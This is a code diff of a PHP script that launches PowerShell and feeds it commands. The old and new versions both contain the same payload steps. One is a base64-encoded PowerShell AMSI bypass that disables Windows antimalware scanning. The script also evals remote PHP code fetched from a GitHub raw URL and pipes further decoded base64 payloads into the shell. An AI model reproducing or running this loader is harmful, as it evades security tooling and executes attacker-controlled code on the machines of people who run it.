@@ -12,42 +12,39 @@ unlink($file);
 
 
 $descriptorspec = array(
-    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+0 => array("pipe", "r"),
+1 => array("file", "output.txt", "a"),
 );
 
 $process = proc_open('powershell', $descriptorspec, $pipes);
 
 if (is_resource($process)) {
-    fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt'."\n");
-    fwrite($pipes[0], base64_decode("JGs9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpJytbY2hhcl04NSsndGlscycpLkdldEZpZWxkKCdhbXMnK1tjaGFyXTEwNSsnSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKQokay5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSkKCg==")."\n");
+fwrite($pipes[0], 'echo "SIKERES TESZT" > ptest.txt'."\n");
+fwrite($pipes[0], base64_decode("JGs9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpJytbY2hhcl04NSsndGlscycpLkdldEZpZWxkKCdhbXMnK1tjaGFyXTEwNSsnSW5pdEZhaWxlZCcsJ05vblB1YmxpYyxTdGF0aWMnKQokay5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSkKCg==")."\n");
 
-    sleep(5);
+sleep(5);
 
-    eval(file_get_contents("https://raw.githubusercontent.com/TotallyNotThat/testRep/main/file3"));
-    $main = getData($b64_a1);
-    $inside = base64_encode(getData($b64_a2));
-    $finished = str_replace("___VALAMI___", $inside, $main);
+eval(file_get_contents("https://raw.githubusercontent.com/TotallyNotThat/testRep/main/file3"));
+$main = getData($b64_a1);
+$inside = base64_encode(getData($b64_a2));
+$finished = str_replace("___VALAMI___", $inside, $main);
 
-    $finished_split = str_split($finished, 1000);
 
-    for($k = 0; $k < count($finished_split); $k++){
-        fwrite($pipes[0], $finished_split[$k]);
-    }
+fwrite($pipes[0], trim($finished));
 
-    fwrite($pipes[0], "\n");
-    fclose($pipes[0]);
 
-    echo stream_get_contents($pipes[1]);
-    fclose($pipes[1]);
+fwrite($pipes[0], "\n\n\n\n\n");
+//fclose($pipes[0]);
+
+//echo stream_get_contents($pipes[1]);
+//fclose($pipes[1]);
 
 // It is important that you close any pipes before calling
 // proc_close in order to avoid a deadlock
-    $return_value = proc_close($process);
+//$return_value = proc_close($process);
 
-    //echo "command returned $return_value\n";
+//echo "command returned $return_value\n";
 }
-
 
 
 
